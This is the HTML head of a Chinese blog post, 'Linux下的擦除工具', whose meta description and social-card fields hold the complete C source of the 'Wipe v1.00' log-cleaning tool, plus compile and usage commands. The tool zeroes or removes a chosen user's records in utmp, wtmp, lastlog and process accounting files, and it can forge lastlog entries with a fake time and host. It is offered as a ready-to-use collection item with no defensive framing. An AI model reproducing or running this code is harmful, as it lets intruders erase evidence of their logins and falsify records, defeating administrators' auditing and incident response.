<!doctype html><html lang=zh dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3988508441804851" crossorigin=anonymous></script><title>Linux下的擦除工具 | 八戒的技术博客</title>
<meta name=keywords content><meta name=description content='Linux下的日志擦除软件，无解释珍藏：
gcc -O3  -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c

wipe u root #w 命令擦掉在线的root
wipe w root #last 命令擦掉root
wipe l root #lastlog 命令擦掉root登录记录
源码如下：
/*
 * Wipe v1.00.
 *
 * Written by The Crawler.
 *
 * Selectively wipe system logs.
 *
 * Usage: wipe [l,u,w] username
 * ex:    wipe l user;wipe u user;wipe w user
 *
 * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
 *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
 * compile with  -DHAVE_LASTLOG_H -DNO_ACCT */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#ifndef NO_ACCT
#include <sys/acct.h>
#endif
#include <utmp.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <time.h>
#include <stdlib.h>

#ifdef HAVE_LASTLOG_H
#include <lastlog.h>
#endif

#ifdef HAVE_UTMPX
#include <utmpx.h>
#endif

/*
 * Try to use the paths out of the include files. 
 * But if we can&#39;t find any, revert to the defaults.
 */
#ifndef UTMP_FILE
#ifdef _PATH_UTMP
#define UTMP_FILE	_PATH_UTMP
#else
#define UTMP_FILE	"/var/adm/utmp"
#endif
#endif 

#ifndef WTMP_FILE
#ifdef _PATH_WTMP
#define WTMP_FILE	_PATH_WTMP
#else
#define WTMP_FILE	"/var/adm/wtmp"
#endif
#endif

#ifndef LASTLOG_FILE
#ifdef _PATH_LASTLOG
#define LASTLOG_FILE	_PATH_LASTLOG
#else
#define LASTLOG_FILE	"/var/adm/lastlog"
#endif
#endif

#ifndef ACCT_FILE
#define ACCT_FILE	"/var/adm/pacct"
#endif

#ifdef HAVE_UTMPX

#ifndef UTMPX_FILE
#define UTMPX_FILE	"/var/adm/utmpx"
#endif

#ifndef WTMPX_FILE
#define WTMPX_FILE	"/var/adm/wtmpx"
#endif

#endif /* HAVE_UTMPX */

#define BUFFSIZE	8192


/* 
 * This function will copy the src file to the dst file.
 */
void
copy_file(char *src, char *dst)
{
	int 	fd1, fd2;
	int	n;
	char	buf[BUFFSIZE];

	if ( (fd1 = open(src, O_RDONLY)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s during copy.\n", src);
		return;
	}

	if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) < 0 ) {
		fprintf(stderr, "ERROR: Creating %s during copy.\n", dst);
		return;
	}
	
	while ( (n = read(fd1, buf, BUFFSIZE)) > 0)
		if (write(fd2, buf, n) != n) {
			fprintf(stderr, "ERROR: Write error during copy.\n");
			return;
		}
		
	if (n < 0) {
		fprintf(stderr, "ERROR: Read error during copy.\n");
		return;
	}

	close(fd1);
	close(fd2);
}


/*
 * UTMP editing.
 */
void
wipe_utmp(char *who, char *line)
{
	int 		fd1;
	struct utmp	ut;
	
	printf("Patching %s .... ", UTMP_FILE);
	fflush(stdout);

	/*
	 * Open the utmp file.
	 */
	if ( (fd1 = open(UTMP_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", UTMP_FILE);
		return;
	}
	
	/*
	 * Copy utmp file excluding relevent entries. 
	 */	
	while ( read(fd1, &amp;ut, sizeof(ut)) > 0) 
		if ( !strncmp(ut.ut_name, who, strlen(who)) )
			if (!line || (line && 
			  !strncmp(ut.ut_line, line, strlen(line)))) {
				bzero((char *) &amp;ut, sizeof(ut));
				lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
				write(fd1, &amp;ut, sizeof(ut));
			}

	close(fd1);

	printf("Done.\n");
}

/*
 * UTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_utmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;

	printf("Patching %s .... ", UTMPX_FILE);
	fflush(stdout);
		
	/*
	 * Open the utmp file and temporary file.
	 */
	if ( (fd1 = open(UTMPX_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", UTMPX_FILE);
		return;
	}

	while ( (read(fd1, &amp;utx, sizeof(utx)) ) > 0) 
		if ( !strncmp(utx.ut_name, who, strlen(who)) )
			if (!line || (line && 
			  !strncmp(utx.ut_line, line, strlen(line)))) {
				bzero((char *) &amp;utx, sizeof(utx));
				lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
				write(fd1, &amp;utx, sizeof(utx));
			}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * WTMP editing.
 */
void
wipe_wtmp(char *who, char *line)
{
	int		fd1;
	struct utmp	ut;

	printf("Patching %s .... ", WTMP_FILE);
	fflush(stdout);
	
        /*
	 * Open the wtmp file and temporary file.
	 */
	if ( (fd1 = open(WTMP_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", WTMP_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
	while ( (read (fd1, &amp;ut, sizeof(ut))) > 0) {
		if (!strncmp(ut.ut_name, who, strlen(who)))
			if (!line || (line && 
			  !strncmp(ut.ut_line, line, strlen(line)))) {
			  	bzero((char *) &amp;ut, sizeof(ut));
				lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
			  	write(fd1, &amp;ut, sizeof(ut));
			  	break;
			}
		lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR);
	}

	close(fd1);
	
	printf("Done.\n");
}


/*
 * WTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_wtmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;
	
	printf("Patching %s .... ", WTMPX_FILE);
	fflush(stdout);
	
	/*
	 * Open the utmp file and temporary file.
	 */
	if ( (fd1 = open(WTMPX_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", WTMPX_FILE);
		return;
	}

	/*
	 * Determine offset of last relevent entry.
	 */
	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
	while ( (read (fd1, &amp;utx, sizeof(utx))) > 0) {
		if (!strncmp(utx.ut_name, who, strlen(who)))
			if (!line || (line && 
			  !strncmp(utx.ut_line, line, strlen(line)))) {
			  	bzero((char *) &amp;utx, sizeof(utx));
				lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
			  	write(fd1, &amp;utx, sizeof(utx));
			  	break;
			}
		lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR);
	}

	close(fd1);

	printf("Done.\n");
}
#endif


/*
 * LASTLOG editing.
 */
void
wipe_lastlog(char *who, char *line, char *timestr, char *host)
{
	int		fd1;
	struct lastlog	ll;
	struct passwd	*pwd;
	struct tm	*tm; 
	char		str[4];

	printf("Patching %s .... ", LASTLOG_FILE);
	fflush(stdout);

	tm = (struct tm *) malloc( sizeof(struct tm) );
	
        /*
	 * Open the lastlog file.
	 */
	if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", LASTLOG_FILE);
		return;
	}

	if ( (pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "ERROR: Can&#39;t find user in passwd.\n");
		return;
	}
	
	lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0);
	bzero((char *) &amp;ll, sizeof(ll));

	if (line) 
		strncpy(ll.ll_line, line, strlen(line));

	if (timestr) {
		/* YYMMddhhmm */
		if (strlen(timestr) != 10) {
			fprintf(stderr, "ERROR: Time format is YYMMddhhmm.\n");
			return;
		}
		
		/*
		 * Extract Times.
		 */
		str[2] = 0;
		str[0] = timestr[0];
		str[1] = timestr[1];
		tm->tm_year = atoi(str);
		
		str[0] = timestr[2];
		str[1] = timestr[3];
		tm->tm_mon = atoi(str) - 1;
		
		str[0] = timestr[4];
		str[1] = timestr[5];
		tm->tm_mday = atoi(str);
		
		str[0] = timestr[6];
		str[1] = timestr[7];
		tm->tm_hour = atoi(str);
		
		str[0] = timestr[8];
		str[1] = timestr[9];
		tm->tm_min = atoi(str);
		tm->tm_sec = 0;
		
		ll.ll_time = mktime(tm);
	}

	if (host)
		strncpy(ll.ll_host, host, sizeof(ll.ll_host));
	

	write(fd1, (char *) &amp;ll, sizeof(ll));

	close(fd1);

	printf("Done.\n");
}


#ifndef NO_ACCT
/*
 * ACCOUNT editing.
 */
void
wipe_acct(char *who, char *line)
{    
	int		fd1, fd2;
	struct acct	ac;
	char		ttyn[50];
	struct passwd   *pwd;
	struct stat	sbuf;
	char		*tmpf;
	
	printf("Patching %s .... ", ACCT_FILE);
	fflush(stdout);

        /*
	 * Open the acct file and temporary file.
	 */
	if ( (fd1 = open(ACCT_FILE, O_RDONLY)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", ACCT_FILE);
		return;
	}

	/*
	 * Grab a unique temporary filename.
	 */
	tmpf = tmpnam((char *) NULL);

	if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) < 0 ) {
		fprintf(stderr, "ERROR: Opening tmp ACCT file\n");
		return;
	}

	if ( (pwd = getpwnam(who)) == NULL) {
		fprintf(stderr, "ERROR: Can&#39;t find user in passwd.\n");
		return;
	}

	/*
	 * Determine tty&#39;s device number
	 */
	strcpy(ttyn, "/dev/");
	strcat(ttyn, line);
	if (stat(ttyn, &amp;sbuf) < 0) {
		fprintf(stderr, "ERROR: Determining tty device number.\n");
		return;
	}
	
	while ( read(fd1, &amp;ac, sizeof(ac)) > 0 ) {
		if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )	
			write(fd2, &amp;ac, sizeof(ac));
	}

	close(fd1);
	close(fd2);
	
	copy_file(tmpf, ACCT_FILE);
	
	if ( unlink(tmpf) < 0 ) {
		fprintf(stderr, "ERROR: Unlinking tmp WTMP file.\n");
		return;
	}

	printf("Done.\n");
} 
#endif


void
usage()
{
	printf("USAGE: wipe [ u|w|l|a ] ...options...\n");
	printf("\n");
	printf("UTMP editing:\n");
	printf("    Erase all usernames      :   wipe u [username]\n");
	printf("    Erase one username on tty:   wipe u [username] [tty]\n");
	printf("\n");
	printf("WTMP editing:\n");
	printf("   Erase last entry for user :   wipe w [username]\n");
	printf("   Erase last entry on tty   :   wipe w [username] [tty]\n");
	printf("\n");	
	printf("LASTLOG editing:\n");
	printf("   Blank lastlog for user    :   wipe l [username]\n");
	printf("   Alter lastlog entry       :   wipe l [username] [tty] [time] [host]\n");
	printf("	Where [time] is in the format [YYMMddhhmm]\n");
	printf("\n");
#ifndef NO_ACCT
	printf("ACCT editing:\n");
	printf("   Erase acct entries on tty :   wipe a [username] [tty]\n");
#endif
	exit(1);
}


int
main(int argc, char *argv[])
{
	char	c;
	
	if (argc < 3)
		usage();

	/*
	 * First character of first argument determines which file to edit.
	 */
	c = toupper(argv[1][0]);
	
	/*
	 * UTMP editing.
	 */
	switch (c) {
		/* UTMP */
		case &#39;U&#39; :
			if (argc == 3)
				wipe_utmp(argv[2], (char *) NULL);
			if (argc ==4)
				wipe_utmp(argv[2], argv[3]);
			
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_utmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_utmpx(argv[2], argv[3]);
#endif
			
			break;
		/* WTMP */
		case &#39;W&#39; :
			if (argc == 3)
				wipe_wtmp(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmp(argv[2], argv[3]);
			
#ifdef HAVE_UTMPX
			if (argc == 3)
				wipe_wtmpx(argv[2], (char *) NULL);
			if (argc == 4)
				wipe_wtmpx(argv[2], argv[3]);
#endif
			
			break;
		/* LASTLOG */
		case &#39;L&#39; :
			if (argc == 3)
				wipe_lastlog(argv[2], (char *) NULL, 
					(char *) NULL, (char *) NULL);
			if (argc == 4)
				wipe_lastlog(argv[2], argv[3], (char *) NULL,
						(char *) NULL);
			if (argc == 5)
				wipe_lastlog(argv[2], argv[3], argv[4], 
						(char *) NULL);
			if (argc == 6)
				wipe_lastlog(argv[2], argv[3], argv[4], 
						argv[5]);
			break;
#ifndef NO_ACCT
		/* ACCT */
		case &#39;A&#39; :
			if (argc != 4)
				usage();
			wipe_acct(argv[2], argv[3]);
			break;
#endif
	}

	return(0);
}
'><meta name=author content="八戒"><link rel=canonical href=https://rendoumi.com/posts/20240129-wipe_linux/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.5d8a858b4ad07d913988e10d3c3dbc8c171f45316a396de8a60d67f44840812d.css integrity="sha256-XYqFi0rQfZE5iOENPD28jBcfRTFqOW3opg1n9EhAgS0=" rel="preload stylesheet" as=style><link rel=icon href=https://rendoumi.com/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://rendoumi.com/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://rendoumi.com/favicon-32x32.png><link rel=apple-touch-icon href=https://rendoumi.com/apple-touch-icon.png><link rel=mask-icon href=https://rendoumi.com/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=https://rendoumi.com/posts/20240129-wipe_linux/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="https://rendoumi.com/posts/20240129-wipe_linux/"><meta property="og:site_name" content="八戒的技术博客"><meta property="og:title" content="Linux下的擦除工具"><meta property="og:description" content='Linux下的日志擦除软件，无解释珍藏：
gcc -O3 -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c wipe u root #w 命令擦掉在线的root wipe w root #last 命令擦掉root wipe l root #lastlog 命令擦掉root登录记录 源码如下：
/* * Wipe v1.00. * * Written by The Crawler. * * Selectively wipe system logs. * * Usage: wipe [l,u,w] username * ex: wipe l user;wipe u user;wipe w user * * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x, * Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX. * compile with -DHAVE_LASTLOG_H -DNO_ACCT */ #include <sys/types.h> #include <sys/stat.h> #include <sys/uio.h> #ifndef NO_ACCT #include <sys/acct.h> #endif #include <utmp.h> #include <fcntl.h> #include <unistd.h> #include <stdio.h> #include <ctype.h> #include <string.h> #include <pwd.h> #include <time.h> #include <stdlib.h> #ifdef HAVE_LASTLOG_H #include <lastlog.h> #endif #ifdef HAVE_UTMPX #include <utmpx.h> #endif /* * Try to use the paths out of the include files. * But if we can&#39;t find any, revert to the defaults. */ #ifndef UTMP_FILE #ifdef _PATH_UTMP #define UTMP_FILE	_PATH_UTMP #else #define UTMP_FILE	"/var/adm/utmp" #endif #endif #ifndef WTMP_FILE #ifdef _PATH_WTMP #define WTMP_FILE	_PATH_WTMP #else #define WTMP_FILE	"/var/adm/wtmp" #endif #endif #ifndef LASTLOG_FILE #ifdef _PATH_LASTLOG #define LASTLOG_FILE	_PATH_LASTLOG #else #define LASTLOG_FILE	"/var/adm/lastlog" #endif #endif #ifndef ACCT_FILE #define ACCT_FILE	"/var/adm/pacct" #endif #ifdef HAVE_UTMPX #ifndef UTMPX_FILE #define UTMPX_FILE	"/var/adm/utmpx" #endif #ifndef WTMPX_FILE #define WTMPX_FILE	"/var/adm/wtmpx" #endif #endif /* HAVE_UTMPX */ #define BUFFSIZE	8192 /* * This function will copy the src file to the dst file. */ void copy_file(char *src, char *dst) { int fd1, fd2; int	n; char	buf[BUFFSIZE]; if ( (fd1 = open(src, O_RDONLY)) < 0 ) { fprintf(stderr, "ERROR: Opening %s during copy.\n", src); return; } if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) < 0 ) { fprintf(stderr, "ERROR: Creating %s during copy.\n", dst); return; } while ( (n = read(fd1, buf, BUFFSIZE)) > 0) if (write(fd2, buf, n) != n) { fprintf(stderr, "ERROR: Write error during copy.\n"); return; } if (n < 0) { fprintf(stderr, "ERROR: Read error during copy.\n"); return; } close(fd1); close(fd2); } /* * UTMP editing. */ void wipe_utmp(char *who, char *line) { int fd1; struct utmp	ut; printf("Patching %s .... ", UTMP_FILE); fflush(stdout); /* * Open the utmp file. */ if ( (fd1 = open(UTMP_FILE, O_RDWR)) < 0 ) { fprintf(stderr, "ERROR: Opening %s\n", UTMP_FILE); return; } /* * Copy utmp file excluding relevent entries. */	while ( read(fd1, &amp;ut, sizeof(ut)) > 0) if ( !strncmp(ut.ut_name, who, strlen(who)) ) if (!line || (line && !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) &amp;ut, sizeof(ut)); lseek(fd1, (int) -sizeof(ut), SEEK_CUR); write(fd1, &amp;ut, sizeof(ut)); } close(fd1); printf("Done.\n"); } /* * UTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_utmpx(char *who, char *line) { int fd1; struct utmpx	utx; printf("Patching %s .... ", UTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(UTMPX_FILE, O_RDWR)) < 0 ) { fprintf(stderr, "ERROR: Opening %s\n", UTMPX_FILE); return; } while ( (read(fd1, &amp;utx, sizeof(utx)) ) > 0) if ( !strncmp(utx.ut_name, who, strlen(who)) ) if (!line || (line && !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) &amp;utx, sizeof(utx)); lseek(fd1, (int) -sizeof(utx), SEEK_CUR); write(fd1, &amp;utx, sizeof(utx)); } close(fd1); printf("Done.\n"); } #endif /* * WTMP editing. */ void wipe_wtmp(char *who, char *line) { int	fd1; struct utmp	ut; printf("Patching %s .... ", WTMP_FILE); fflush(stdout); /* * Open the wtmp file and temporary file. */ if ( (fd1 = open(WTMP_FILE, O_RDWR)) < 0 ) { fprintf(stderr, "ERROR: Opening %s\n", WTMP_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(ut)), SEEK_END); while ( (read (fd1, &amp;ut, sizeof(ut))) > 0) { if (!strncmp(ut.ut_name, who, strlen(who))) if (!line || (line && !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) &amp;ut, sizeof(ut)); lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR); write(fd1, &amp;ut, sizeof(ut)); break; } lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR); } close(fd1); printf("Done.\n"); } /* * WTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_wtmpx(char *who, char *line) { int fd1; struct utmpx	utx; printf("Patching %s .... ", WTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(WTMPX_FILE, O_RDWR)) < 0 ) { fprintf(stderr, "ERROR: Opening %s\n", WTMPX_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(utx)), SEEK_END); while ( (read (fd1, &amp;utx, sizeof(utx))) > 0) { if (!strncmp(utx.ut_name, who, strlen(who))) if (!line || (line && !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) &amp;utx, sizeof(utx)); lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR); write(fd1, &amp;utx, sizeof(utx)); break; } lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR); } close(fd1); printf("Done.\n"); } #endif /* * LASTLOG editing. */ void wipe_lastlog(char *who, char *line, char *timestr, char *host) { int	fd1; struct lastlog	ll; struct passwd	*pwd; struct tm	*tm; char	str[4]; printf("Patching %s .... ", LASTLOG_FILE); fflush(stdout); tm = (struct tm *) malloc( sizeof(struct tm) ); /* * Open the lastlog file. */ if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) < 0 ) { fprintf(stderr, "ERROR: Opening %s\n", LASTLOG_FILE); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, "ERROR: Can&#39;t find user in passwd.\n"); return; } lseek(fd1, (long) pwd->pw_uid * sizeof(struct lastlog), 0); bzero((char *) &amp;ll, sizeof(ll)); if (line) strncpy(ll.ll_line, line, strlen(line)); if (timestr) { /* YYMMddhhmm */ if (strlen(timestr) != 10) { fprintf(stderr, "ERROR: Time format is YYMMddhhmm.\n"); return; } /* * Extract Times. */ str[2] = 0; str[0] = timestr[0]; str[1] = timestr[1]; tm->tm_year = atoi(str); str[0] = timestr[2]; str[1] = timestr[3]; tm->tm_mon = atoi(str) - 1; str[0] = timestr[4]; str[1] = timestr[5]; tm->tm_mday = atoi(str); str[0] = timestr[6]; str[1] = timestr[7]; tm->tm_hour = atoi(str); str[0] = timestr[8]; str[1] = timestr[9]; tm->tm_min = atoi(str); tm->tm_sec = 0; ll.ll_time = mktime(tm); } if (host) strncpy(ll.ll_host, host, sizeof(ll.ll_host)); write(fd1, (char *) &amp;ll, sizeof(ll)); close(fd1); printf("Done.\n"); } #ifndef NO_ACCT /* * ACCOUNT editing. */ void wipe_acct(char *who, char *line) { int	fd1, fd2; struct acct	ac; char	ttyn[50]; struct passwd *pwd; struct stat	sbuf; char	*tmpf; printf("Patching %s .... ", ACCT_FILE); fflush(stdout); /* * Open the acct file and temporary file. */ if ( (fd1 = open(ACCT_FILE, O_RDONLY)) < 0 ) { fprintf(stderr, "ERROR: Opening %s\n", ACCT_FILE); return; } /* * Grab a unique temporary filename. */ tmpf = tmpnam((char *) NULL); if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) < 0 ) { fprintf(stderr, "ERROR: Opening tmp ACCT file\n"); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, "ERROR: Can&#39;t find user in passwd.\n"); return; } /* * Determine tty&#39;s device number */ strcpy(ttyn, "/dev/"); strcat(ttyn, line); if (stat(ttyn, &amp;sbuf) < 0) { fprintf(stderr, "ERROR: Determining tty device number.\n"); return; } while ( read(fd1, &amp;ac, sizeof(ac)) > 0 ) { if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )	write(fd2, &amp;ac, sizeof(ac)); } close(fd1); close(fd2); copy_file(tmpf, ACCT_FILE); if ( unlink(tmpf) < 0 ) { fprintf(stderr, "ERROR: Unlinking tmp WTMP file.\n"); return; } printf("Done.\n"); } #endif void usage() { printf("USAGE: wipe [ u|w|l|a ] ...options...\n"); printf("\n"); printf("UTMP editing:\n"); printf(" Erase all usernames : wipe u [username]\n"); printf(" Erase one username on tty: wipe u [username] [tty]\n"); printf("\n"); printf("WTMP editing:\n"); printf(" Erase last entry for user : wipe w [username]\n"); printf(" Erase last entry on tty : wipe w [username] [tty]\n"); printf("\n");	printf("LASTLOG editing:\n"); printf(" Blank lastlog for user : wipe l [username]\n"); printf(" Alter lastlog entry : wipe l [username] [tty] [time] [host]\n"); printf("	Where [time] is in the format [YYMMddhhmm]\n"); printf("\n"); #ifndef NO_ACCT printf("ACCT editing:\n"); printf(" Erase acct entries on tty : wipe a [username] [tty]\n"); #endif exit(1); } int main(int argc, char *argv[]) { char	c; if (argc < 3) usage(); /* * First character of first argument determines which file to edit. */ c = toupper(argv[1][0]); /* * UTMP editing. */ switch (c) { /* UTMP */ case &#39;U&#39; : if (argc == 3) wipe_utmp(argv[2], (char *) NULL); if (argc ==4) wipe_utmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_utmpx(argv[2], (char *) NULL); if (argc == 4) wipe_utmpx(argv[2], argv[3]); #endif break; /* WTMP */ case &#39;W&#39; : if (argc == 3) wipe_wtmp(argv[2], (char *) NULL); if (argc == 4) wipe_wtmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_wtmpx(argv[2], (char *) NULL); if (argc == 4) wipe_wtmpx(argv[2], argv[3]); #endif break; /* LASTLOG */ case &#39;L&#39; : if (argc == 3) wipe_lastlog(argv[2], (char *) NULL, (char *) NULL, (char *) NULL); if (argc == 4) wipe_lastlog(argv[2], argv[3], (char *) NULL, (char *) NULL); if (argc == 5) wipe_lastlog(argv[2], argv[3], argv[4], (char *) NULL); if (argc == 6) wipe_lastlog(argv[2], argv[3], argv[4], argv[5]); break; #ifndef NO_ACCT /* ACCT */ case &#39;A&#39; : if (argc != 4) usage(); wipe_acct(argv[2], argv[3]); break; #endif } return(0); } '><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-01-29T10:52:11+08:00"><meta property="article:modified_time" content="2024-01-29T10:52:11+08:00"><meta property="og:image" content="https://rendoumi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://rendoumi.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Linux下的擦除工具"><meta name=twitter:description content='Linux下的日志擦除软件，无解释珍藏：
gcc -O3  -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c

wipe u root #w 命令擦掉在线的root
wipe w root #last 命令擦掉root
wipe l root #lastlog 命令擦掉root登录记录
源码如下：
/*
 * Wipe v1.00.
 *
 * Written by The Crawler.
 *
 * Selectively wipe system logs.
 *
 * Usage: wipe [l,u,w] username
 * ex:    wipe l user;wipe u user;wipe w user
 *
 * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,
 *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.
 * compile with  -DHAVE_LASTLOG_H -DNO_ACCT */

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/uio.h>
#ifndef NO_ACCT
#include <sys/acct.h>
#endif
#include <utmp.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <pwd.h>
#include <time.h>
#include <stdlib.h>

#ifdef HAVE_LASTLOG_H
#include <lastlog.h>
#endif

#ifdef HAVE_UTMPX
#include <utmpx.h>
#endif

/*
 * Try to use the paths out of the include files. 
 * But if we can&#39;t find any, revert to the defaults.
 */
#ifndef UTMP_FILE
#ifdef _PATH_UTMP
#define UTMP_FILE	_PATH_UTMP
#else
#define UTMP_FILE	"/var/adm/utmp"
#endif
#endif 

#ifndef WTMP_FILE
#ifdef _PATH_WTMP
#define WTMP_FILE	_PATH_WTMP
#else
#define WTMP_FILE	"/var/adm/wtmp"
#endif
#endif

#ifndef LASTLOG_FILE
#ifdef _PATH_LASTLOG
#define LASTLOG_FILE	_PATH_LASTLOG
#else
#define LASTLOG_FILE	"/var/adm/lastlog"
#endif
#endif

#ifndef ACCT_FILE
#define ACCT_FILE	"/var/adm/pacct"
#endif

#ifdef HAVE_UTMPX

#ifndef UTMPX_FILE
#define UTMPX_FILE	"/var/adm/utmpx"
#endif

#ifndef WTMPX_FILE
#define WTMPX_FILE	"/var/adm/wtmpx"
#endif

#endif /* HAVE_UTMPX */

#define BUFFSIZE	8192


/* 
 * This function will copy the src file to the dst file.
 */
void
copy_file(char *src, char *dst)
{
	int 	fd1, fd2;
	int	n;
	char	buf[BUFFSIZE];

	if ( (fd1 = open(src, O_RDONLY)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s during copy.\n", src);
		return;
	}

	if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) < 0 ) {
		fprintf(stderr, "ERROR: Creating %s during copy.\n", dst);
		return;
	}
	
	while ( (n = read(fd1, buf, BUFFSIZE)) > 0)
		if (write(fd2, buf, n) != n) {
			fprintf(stderr, "ERROR: Write error during copy.\n");
			return;
		}
		
	if (n < 0) {
		fprintf(stderr, "ERROR: Read error during copy.\n");
		return;
	}

	close(fd1);
	close(fd2);
}


/*
 * UTMP editing.
 */
void
wipe_utmp(char *who, char *line)
{
	int 		fd1;
	struct utmp	ut;
	
	printf("Patching %s .... ", UTMP_FILE);
	fflush(stdout);

	/*
	 * Open the utmp file.
	 */
	if ( (fd1 = open(UTMP_FILE, O_RDWR)) < 0 ) {
		fprintf(stderr, "ERROR: Opening %s\n", UTMP_FILE);
		return;
	}
	
	/*
	 * Copy utmp file excluding relevent entries. 
	 */	
	while ( read(fd1, &amp;ut, sizeof(ut)) > 0) 
		if ( !strncmp(ut.ut_name, who, strlen(who)) )
			if (!line || (line && 
			  !strncmp(ut.ut_line, line, strlen(line)))) {
				bzero((char *) &amp;ut, sizeof(ut));
				lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
				write(fd1, &amp;ut, sizeof(ut));
			}

	close(fd1);

	printf("Done.\n");
}

/*
 * UTMPX editing if supported.
 */
#ifdef HAVE_UTMPX
void
wipe_utmpx(char *who, char *line)
{
	int 		fd1;
	struct utmpx	utx;

	printf("Patching %s .... ", UTMPX_FILE);
